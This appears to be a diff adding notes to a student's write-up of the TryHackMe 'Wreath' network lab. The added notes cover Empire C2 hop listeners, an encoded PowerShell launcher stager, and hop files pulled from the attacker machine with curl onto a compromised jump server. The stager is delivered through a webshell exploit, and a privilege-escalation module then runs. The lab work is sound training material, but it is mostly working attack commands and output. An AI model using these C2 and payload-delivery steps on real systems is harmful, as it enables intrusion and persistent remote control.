@@ -2037,5 +2037,181 @@ root
 
 ### Hop Listeners
 
+- Empire agents cant be proxied through socat relay
+- Hop Listener creates listener to list of listener
+- Instead of opening a port, hop listeners create files to be copied across to the compromised `jump` server
+- The files contain instructions to connect back to normal listener
+- `http_hop` listener
+
+1. `uselistener http_hop`
+
+```
+(Empire) > uselistener http_hop
+(Empire: listeners/http_hop) > set Host 10.200.85.200
+(Empire: listeners/http_hop) > set Port 16999
+(Empire: listeners/http_hop) > set RedirectListener Gitserver
+(Empire: listeners/http_hop) > execute
+[*] Starting listener 'http_hop'
+[*] Hop redirector written to /tmp/http_hop//admin/get.php . Place this file on the redirect server.                                                                                                  
+[*] Hop redirector written to /tmp/http_hop//news.php . Place this file on the redirect server.
+[*] Hop redirector written to /tmp/http_hop//login/process.php . Place this file on the redirect server.                                                                                              
+[+] Listener successfully started!
+```
+
+- `RedirectListener` - regular listener to forward any received agents (previously set up)
+- `Host` - IP of compromised webserver (.200)
+- `Port` - Port used for the webserver hosting the hop files
+
+> Note created files `/tmp/http_hop//admin/get.php`, `/tmp/http_hop//news.php`, `/tmp/http_hop//login/process.php` need to be in the webserver 
+
+### Git server
+
+1. Generate stager for the target
+2. Put `http_hop` files created into position on .200
+
+1. Create stager `multi/launcher`
+
+```
+(Empire) > usestager multi/launcher
+(Empire: stager/multi/launcher) > set Listener http_hop
+(Empire: stager/multi/launcher) > execute
+powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAcwBJAE8ATgBUAGEAQgBMAEUALgBQAFMAVgBlAHIAcwBJAE8AbgAuAE0AYQBKAE8AcgAgAC0ARwBFACAAMwApAHsAJABDADMAMgAyAD0AWwByAGUAZgBdAC4AQQBzAHMAZQBNAGIAbABZAC4ARwBFAFQAVAB5AHAA
+...
+JEAPQAkAEQAYQBUAEEAWwA0AC4ALgAkAGQAYQBUAGEALgBsAGUAbgBnAHQASABdADsALQBqAG8ASQBOAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
+
+```
+
+Copy the payload into the clipboard
+
+2. Set up hop files on the jumpserver
+
+First we zip up the 3 files and host on http server
+```
+kali@kali:~$ ls /tmp/http_hop/
+admin  login  news.php
+kali@kali:~$ cd /tmp/http_hop/
+kali@kali:/tmp/http_hop$ sudo zip -r hop.zip *
+[sudo] password for kali: 
+  adding: admin/ (stored 0%)
+  adding: admin/get.php (deflated 67%)
+  adding: login/ (stored 0%)
+  adding: login/process.php (deflated 67%)
+  adding: news.php (deflated 67%)
+kali@kali:/tmp/http_hop$ ls
+admin  hop.zip  login  news.php
+kali@kali:/tmp/http_hop$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.200.85.200 - - [21/Apr/2021 05:38:41] "GET /hop.zip HTTP/1.1" 200 -
+```
+
+Then we make appropriate directory, download the zip and unzip it
+```
+[root@prod-serv ~]# mkdir -p /tmp/hop-Neozer0
+[root@prod-serv ~]# cd /tmp/hop-Neozer0/
+[root@prod-serv hop-Neozer0]# pwd
+/tmp/hop-Neozer0
+[root@prod-serv hop-Neozer0]# curl http://10.50.86.79/hop.zip -o hop.zip
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2961  100  2961    0     0   5149      0 --:--:-- --:--:-- --:--:--  5149
+[root@prod-serv hop-Neozer0]# ls
+hop.zip
+[root@prod-serv hop-Neozer0]# unzip hop.zip 
+Archive:  hop.zip
+   creating: admin/
+  inflating: admin/get.php           
+   creating: login/
+  inflating: login/process.php       
+  inflating: news.php                
+[root@prod-serv hop-Neozer0]# ls
+admin  hop.zip  login  news.php
+```
+
+Fortunately this webserver has php install so we can use this to serve our files
+```
+[root@prod-serv hop-Neozer0]# php -S 0.0.0.0:16999 &>/dev/null &
+[1] 3558
+[root@prod-serv hop-Neozer0]# ss -tulwn | grep 16999
+tcp     LISTEN   0        128              0.0.0.0:16999          0.0.0.0:*  
+```
+
+We also need to open the port from firewall
+```
+[root@prod-serv hop-Neozer0]# firewall-cmd --zone=public --add-port 16999/tcp
+success
+```
+
+Now to run the payload via our previous exploit
+
+We pasted in the payload (url encoded)
+```
+kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=powershell%20-noP%20-sta%20-w%201%20-enc%20%20SQBmACgAJABQAFMAVgBlAFIAcwBJAE8ATgBUAGEAQgB
+...
+```
+
+Back on empire we get
+```
+(Empire: stager/multi/launcher) > 
+[*] Sending POWERSHELL stager (stage 1) to 10.200.85.200                                                          
+[*] New agent 3C6PWFDL checked in
+[+] Initial agent 3C6PWFDL from 10.200.85.200 now active (Slack)
+[*] Sending agent (stage 2) to 3C6PWFDL at 10.200.85.200
+```
+
+> Note the ip is still .20 because of the jump server between our target (Git server) and our empire client acting as a proxy out of the network
+
+</details>
+
+## 19. Empire - modules and Conclusion
+
+<details>
+  <summary>---</summary>
+
+- Modules perform various tasks on compromised target
+- Eg. we could use Mimikatz through Empire module to dump various secrets from the target
+
+```
+(Empire: agents) > usemodule powershell/privesc/sherlock
+(Empire: powershell/privesc/sherlock) > info
+
+              Name: Sherlock
+            Module: powershell/privesc/sherlock
+        NeedsAdmin: False
+         OpsecSafe: True
+          Language: powershell
+MinLanguageVersion: 2
+        Background: True
+   OutputExtension: None
+
+Authors:
+  @_RastaMouse
+
+Description:
+  Find Windows local privilege escalation vulnerabilities.
+
+Comments:
+  https://github.com/rasta-mouse/Sherlock
+
+Options:
+
+  Name  Required    Value                     Description
+  ----  --------    -------                   -----------
+  Agent True        None                      Agent to run module on.                 
+
+(Empire: powershell/privesc/sherlock) > set Agent 3C6PWFDL
+(Empire: powershell/privesc/sherlock) > execute
+[*] Tasked 3C6PWFDL to run TASK_CMD_JOB
+[*] Agent 3C6PWFDL tasked with task ID 1
+[*] Tasked agent 3C6PWFDL to run module powershell/privesc/sherlock
+```
+
+`searchmodule` can also be used to find modules
+
+### Conclusion
+
+- C2 frameworks used to consolidate access to compromised machine & streamline post exploitation attempts
+- Many C2 frameworks available
+- Empire and Starkiller
+
 
 </details>
